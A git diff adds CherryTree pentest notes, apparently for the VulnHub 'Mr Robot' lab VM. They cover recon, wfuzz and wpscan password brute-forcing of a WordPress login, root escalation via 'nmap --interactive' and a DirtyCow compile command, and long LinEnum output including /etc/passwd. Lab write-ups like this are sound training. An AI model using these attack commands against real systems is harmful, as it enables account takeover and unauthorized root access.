@@ -1,0 +1,1076 @@
+<?xml version="1.0" ?>
+<cherrytree>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="Information Gathering" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1578393691.86" ts_lastsave="1578953535.37" unique_id="1">
+		<rich_text>IP 192.168.22.128</rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="Versions and Ports" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1578953521.27" ts_lastsave="1579126233.32" unique_id="2">
+			<rich_text>IP 192.168.22.128 
+
+
+Ports 443 , 80 , 22 
+
+
+Port 443 : 
+
+</rich_text>
+			<rich_text link="webs http://www.example.com">www.example.com</rich_text>
+			<rich_text> 
+
+Port 80 : 
+Enumeration : 
+XMLRPC Exploit 
+BruteForce 
+</rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="Port 80 Wordpress " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1578953727.8" ts_lastsave="1579123897.93" unique_id="3">
+				<rich_text>XMLRPCE : 
+
+POST /xmlrpc.php HTTP/1.1
+Host: 192.168.22.128
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: s_fid=3456A7FB8FFD018D-0D80D65D894A19E5; s_nr=1578394887601; s_cc=true; s_sq=%5B%5BB%5D%5D
+Upgrade-Insecure-Requests: 1
+DNT: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 245
+
+
+</rich_text>
+				<rich_text link="webs https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/">https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text link="webs https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32">https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32</rich_text>
+				<rich_text>
+
+
+Robots.TXT :  
+fsocity.dic
+key-1-of-3.txt
+
+Dirbuster : 
+
+dibuster.txt output
+
+
+
+
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="Brute Force Username Password" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579123897.93" ts_lastsave="1579130381.4" unique_id="4">
+				<rich_text>Wordlist Used : fsocity.dic
+
+program : WFUZZ
+
+
+
+syntax : 
+
+wfuzz -c -z file,/root/Documents/MrRobot/fsoc.dic — hs incorrect -d “log=eliott&amp;pwd=FUZZ” </rich_text>
+				<rich_text link="webs http://192.168.240.129/wo-login.php">http://192.168.240.129/wp-login.php</rich_text>
+				<rich_text>
+
+
+
+Program : WPSCAN 
+
+
+syntax : 
+
+</rich_text>
+				<rich_text family="monospace">wpscan -u 192.168.88.129 --username elliot --wordlist /root/vulnhub/mrrobot/small.dic</rich_text>
+				<rich_text>
+
+</rich_text>
+			</node>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="References " prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579126233.32" ts_lastsave="1579126234.9" unique_id="7">
+			<rich_text link="webs https://mars-cheng.github.io/blog/2018/Vulnhub-Mr-Robot-1-Write-up/">https://mars-cheng.github.io/blog/2018/Vulnhub-Mr-Robot-1-Write-up/</rich_text>
+			<rich_text>
+
+
+</rich_text>
+			<rich_text link="webs https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</rich_text>
+			<rich_text>
+
+
+
+</rich_text>
+			<rich_text link="webs https://www.exploit-db.com/exploits/33824">https://www.exploit-db.com/exploits/33824</rich_text>
+			<rich_text>
+
+
+</rich_text>
+			<rich_text link="webs https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="PrivEscelation 1" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579124230.57" ts_lastsave="1579130396.35" unique_id="6">
+			<rich_text>Using Nmap : 
+
+/usr/local/bin/nmap
+
+syntax : 
+# /usr/local/bin/nmap --interactive 
+
+!sh -&gt; will lead into a syntax 
+
+when you write a a syntax , then you are in. </rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="PrivEscelation 2" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1579130396.35" ts_lastsave="1579130493.97" unique_id="8">
+			<rich_text>DirtyCow 
+
+Refernce : 
+
+</rich_text>
+			<rich_text link="webs https://nullku7.github.io/stuff/vulnhub/walkthrough/2017/05/28/vulnhub-mr-robot.html">https://nullku7.github.io/stuff/vulnhub/walkthrough/2017/05/28/vulnhub-mr-robot.html</rich_text>
+			<rich_text> 
+
+exploit CVE : CVE-2016-5195
+
+</rich_text>
+			<rich_text link="webs https://www.exploit-db.com/exploits/40847">https://www.exploit-db.com/exploits/40847</rich_text>
+			<rich_text>
+
+
+
+
+Syntax : 
+
+g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="LinEnum" prog_lang="sh" readonly="False" tags="" ts_creation="1579124058.36" ts_lastsave="1579124059.51" unique_id="5">
+			<rich_text>#########################################################
+# Local Linux Enumeration &amp; Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.96
+
+[-] Debug Info
+[+] Thorough tests = Disabled
+
+
+Scan started at:
+Wed Jan 15 21:28:42 UTC 2020
+
+
+### SYSTEM ##############################################
+[-] Kernel information:
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+
+
+[-] Kernel information (continued):
+Linux version 3.13.0-55-generic (buildd@brownie) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015
+
+
+[-] Specific release information:
+DISTRIB_ID=Ubuntu
+DISTRIB_RELEASE=14.04
+DISTRIB_CODENAME=trusty
+DISTRIB_DESCRIPTION=&quot;Ubuntu 14.04.2 LTS&quot;
+NAME=&quot;Ubuntu&quot;
+VERSION=&quot;14.04.2 LTS, Trusty Tahr&quot;
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME=&quot;Ubuntu 14.04.2 LTS&quot;
+VERSION_ID=&quot;14.04&quot;
+HOME_URL=&quot;http://www.ubuntu.com/&quot;
+SUPPORT_URL=&quot;http://help.ubuntu.com/&quot;
+BUG_REPORT_URL=&quot;http://bugs.launchpad.net/ubuntu/&quot;
+
+
+[-] Hostname:
+linux
+
+
+### USER/GROUP ##########################################
+[-] Current user/group info:
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+
+[-] Users that have previously logged onto the system:
+Username         Port     From             Latest
+root             tty1                      Sat Nov 14 23:32:42 +0000 2015
+bitnamiftp       tty1                      Fri Nov 13 01:15:03 +0000 2015
+robot            tty1                      Fri Nov 13 23:50:42 +0000 2015
+
+
+[-] Who else is logged on:
+ 21:28:42 up 17:14,  0 users,  load average: 0.00, 0.05, 0.18
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+
+[-] Group memberships:
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)
+uid=101(syslog) gid=104(syslog) groups=104(syslog),4(adm)
+uid=102(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=103(ftp) gid=106(ftp) groups=106(ftp)
+uid=1000(bitnamiftp) gid=1000(bitnami) groups=1000(bitnami)
+uid=1001(mysql) gid=1001(mysql) groups=1001(mysql)
+uid=999(varnish) gid=999(varnish) groups=999(varnish)
+uid=1002(robot) gid=1002(robot) groups=1002(robot)
+
+
+[-] It looks like we have some admin users:
+uid=101(syslog) gid=104(syslog) groups=104(syslog),4(adm)
+
+
+[-] Contents of /etc/passwd:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
+bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
+mysql:x:1001:1001::/home/mysql:
+varnish:x:999:999::/home/varnish:
+robot:x:1002:1002::/home/robot:
+
+
+[-] Super user account(s):
+root
+
+
+[-] Are permissions on /home directories lax:
+total 12K
+drwxr-xr-x  3 root root 4.0K Nov 13  2015 .
+drwxr-xr-x 22 root root 4.0K Sep 16  2015 ..
+drwxr-xr-x  2 root root 4.0K Nov 13  2015 robot
+
+
+### ENVIRONMENTAL #######################################
+[-] Environment information:
+LDAPCONF=/opt/bitnami/common/etc/openldap/ldap.conf
+SSL_CERT_FILE=/opt/bitnami/common/openssl/certs/curl-ca-bundle.crt
+CURL_CA_BUNDLE=/opt/bitnami/common/openssl/certs/curl-ca-bundle.crt
+MAGICK_CONFIGURE_PATH=
+GS_LIB=
+OPENSSL_ENGINES=/opt/bitnami/common/lib/engines
+USER=daemon
+MAGICK_CODER_MODULE_PATH=
+FREETDSLOCALES=
+PATH=/opt/bitnami/varnish/bin:/opt/bitnami/sqlite/bin:/opt/bitnami/php/bin:/opt/bitnami/mysql/bin:/opt/bitnami/apache2/bin:/opt/bitnami/common/bin:/sbin:/usr/sbin:/bin:/usr/bin
+PWD=/tmp
+FREETDSCONF=
+MAGICK_HOME=
+HOME=/usr/sbin
+SHLVL=2
+OPENSSL_CONF=/opt/bitnami/common/openssl/openssl.cnf
+_=/usr/bin/env
+
+
+[-] Path information:
+/opt/bitnami/varnish/bin:/opt/bitnami/sqlite/bin:/opt/bitnami/php/bin:/opt/bitnami/mysql/bin:/opt/bitnami/apache2/bin:/opt/bitnami/common/bin:/sbin:/usr/sbin:/bin:/usr/bin
+
+
+[-] Available shells:
+# /etc/shells: valid login shells
+/bin/sh
+/bin/dash
+/bin/bash
+/bin/rbash
+/usr/bin/screen
+
+/bin/bitnami_ftp_false
+
+
+[-] Current umask value:
+0000
+u=rwx,g=rwx,o=rwx
+
+
+[-] umask value as specified in /etc/login.defs:
+UMASK		022
+
+
+[-] Password and storage information:
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+
+### JOBS/TASKS ##########################################
+[-] Cron jobs:
+-rw-r--r-- 1 root root  787 Jan  7 02:39 /etc/crontab
+
+/etc/cron.d:
+total 12
+drwxr-xr-x  2 root root 4096 Jun 24  2015 .
+drwxr-xr-x 77 root root 4096 Jan  8 03:01 ..
+-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder
+
+/etc/cron.daily:
+total 44
+drwxr-xr-x  2 root root  4096 Jun 24  2015 .
+drwxr-xr-x 77 root root  4096 Jan  8 03:01 ..
+-rw-r--r--  1 root root   102 Feb  9  2013 .placeholder
+-rwxr-xr-x  1 root root 15481 Apr 10  2014 apt
+-rwxr-xr-x  1 root root   256 Mar  7  2014 dpkg
+-rwxr-xr-x  1 root root   372 Jan 22  2014 logrotate
+-rwxr-xr-x  1 root root   249 Feb 17  2014 passwd
+-rwxr-xr-x  1 root root   328 Jul 18  2014 upstart
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Jun 24  2015 .
+drwxr-xr-x 77 root root 4096 Jan  8 03:01 ..
+-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder
+
+/etc/cron.monthly:
+total 12
+drwxr-xr-x  2 root root 4096 Jun 24  2015 .
+drwxr-xr-x 77 root root 4096 Jan  8 03:01 ..
+-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder
+
+/etc/cron.weekly:
+total 16
+drwxr-xr-x  2 root root 4096 Jun 24  2015 .
+drwxr-xr-x 77 root root 4096 Jan  8 03:01 ..
+-rw-r--r--  1 root root  102 Feb  9  2013 .placeholder
+-rwxr-xr-x  1 root root  427 Apr 16  2014 fstrim
+
+
+[-] Crontab contents:
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#
+11 * * * * bitnami cd /opt/bitnami/stats &amp;&amp; ./agent.bin --run -D
+
+
+### NETWORKING  ##########################################
+[-] Network and IP info:
+eth0      Link encap:Ethernet  HWaddr 00:0c:29:05:de:2d  
+          inet addr:192.168.22.128  Bcast:192.168.22.255  Mask:255.255.255.0
+          inet6 addr: fe80::20c:29ff:fe05:de2d/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:2672894 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:4385318 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:277325122 (277.3 MB)  TX bytes:5038137186 (5.0 GB)
+          Interrupt:18 Base address:0x2000 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+          RX packets:14632 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:14632 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:44766770 (44.7 MB)  TX bytes:44766770 (44.7 MB)
+
+
+[-] ARP history:
+? (192.168.22.131) at 00:0c:29:ab:ea:b1 [ether] on eth0
+? (192.168.22.129) at &lt;incomplete&gt; on eth0
+? (192.168.22.254) at 00:50:56:e9:78:e7 [ether] on eth0
+? (192.168.22.2) at 00:50:56:e1:bb:64 [ether] on eth0
+
+
+[-] Nameserver(s):
+nameserver 192.168.22.2
+nameserver 127.0.1.1
+
+
+[-] Default route:
+default         192.168.22.2    0.0.0.0         UG    0      0        0 eth0
+
+
+[-] Listening TCP:
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:2812          0.0.0.0:*               LISTEN      -               
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
+tcp        0      0 192.168.22.128:56257    192.168.22.131:80       TIME_WAIT   -               
+tcp        0      0 192.168.22.128:34531    192.168.22.131:9000     ESTABLISHED 4779/php-fpm: pool 
+tcp6       0      0 :::443                  :::*                    LISTEN      -               
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+tcp6       0      0 192.168.22.128:80       192.168.22.131:57286    TIME_WAIT   -               
+
+
+[-] Listening UDP:
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+udp        0      0 0.0.0.0:63845           0.0.0.0:*                           -               
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               
+udp6       0      0 :::43808                :::*                                -               
+
+
+### SERVICES #############################################
+[-] Running processes:
+USER        PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root          1  0.0  0.3  33240  1612 ?        Ss   04:14   0:00 /sbin/init
+root          2  0.0  0.0      0     0 ?        S    04:14   0:00 [kthreadd]
+root          3  0.0  0.0      0     0 ?        S    04:14   0:08 [ksoftirqd/0]
+root          5  0.0  0.0      0     0 ?        S&lt;   04:14   0:00 [kworker/0:0H]
+root          7  0.0  0.0      0     0 ?        S    04:14   0:15 [rcu_sched]
+root          8  0.0  0.0      0     0 ?        S    04:14   0:24 [rcuos/0]
+root          9  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/1]
+root         10  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/2]
+root         11  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/3]
+root         12  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/4]
+root         13  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/5]
+root         14  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/6]
+root         15  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/7]
+root         16  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/8]
+root         17  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/9]
+root         18  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/10]
+root         19  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/11]
+root         20  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/12]
+root         21  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/13]
+root         22  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/14]
+root         23  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/15]
+root         24  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/16]
+root         25  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/17]
+root         26  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/18]
+root         27  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/19]
+root         28  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/20]
+root         29  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/21]
+root         30  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/22]
+root         31  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/23]
+root         32  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/24]
+root         33  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/25]
+root         34  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/26]
+root         35  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/27]
+root         36  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/28]
+root         37  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/29]
+root         38  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/30]
+root         39  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/31]
+root         40  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/32]
+root         41  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/33]
+root         42  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/34]
+root         43  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/35]
+root         44  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/36]
+root         45  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/37]
+root         46  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/38]
+root         47  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/39]
+root         48  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/40]
+root         49  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/41]
+root         50  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/42]
+root         51  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/43]
+root         52  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/44]
+root         53  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/45]
+root         54  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/46]
+root         55  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/47]
+root         56  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/48]
+root         57  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/49]
+root         58  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/50]
+root         59  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/51]
+root         60  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/52]
+root         61  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/53]
+root         62  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/54]
+root         63  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/55]
+root         64  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/56]
+root         65  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/57]
+root         66  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/58]
+root         67  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/59]
+root         68  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/60]
+root         69  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/61]
+root         70  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/62]
+root         71  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/63]
+root         72  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/64]
+root         73  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/65]
+root         74  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/66]
+root         75  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/67]
+root         76  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/68]
+root         77  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/69]
+root         78  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/70]
+root         79  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/71]
+root         80  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/72]
+root         81  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/73]
+root         82  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/74]
+root         83  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/75]
+root         84  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/76]
+root         85  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/77]
+root         86  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/78]
+root         87  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/79]
+root         88  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/80]
+root         89  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/81]
+root         90  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/82]
+root         91  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/83]
+root         92  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/84]
+root         93  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/85]
+root         94  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/86]
+root         95  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/87]
+root         96  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/88]
+root         97  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/89]
+root         98  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/90]
+root         99  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/91]
+root        100  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/92]
+root        101  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/93]
+root        102  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/94]
+root        103  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/95]
+root        104  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/96]
+root        105  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/97]
+root        106  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/98]
+root        107  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/99]
+root        108  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/100]
+root        109  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/101]
+root        110  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/102]
+root        111  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/103]
+root        112  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/104]
+root        113  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/105]
+root        114  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/106]
+root        115  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/107]
+root        116  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/108]
+root        117  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/109]
+root        118  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/110]
+root        119  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/111]
+root        120  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/112]
+root        121  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/113]
+root        122  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/114]
+root        123  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/115]
+root        124  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/116]
+root        125  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/117]
+root        126  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/118]
+root        127  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/119]
+root        128  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/120]
+root        129  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/121]
+root        130  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/122]
+root        131  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/123]
+root        132  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/124]
+root        133  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/125]
+root        134  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/126]
+root        135  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuos/127]
+root        136  0.0  0.0      0     0 ?        S    04:14   0:00 [rcu_bh]
+root        137  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/0]
+root        138  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/1]
+root        139  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/2]
+root        140  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/3]
+root        141  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/4]
+root        142  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/5]
+root        143  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/6]
+root        144  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/7]
+root        145  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/8]
+root        146  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/9]
+root        147  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/10]
+root        148  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/11]
+root        149  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/12]
+root        150  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/13]
+root        151  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/14]
+root        152  0.0  0.0      0     0 ?        S    04:14   0:00 [rcuob/15]
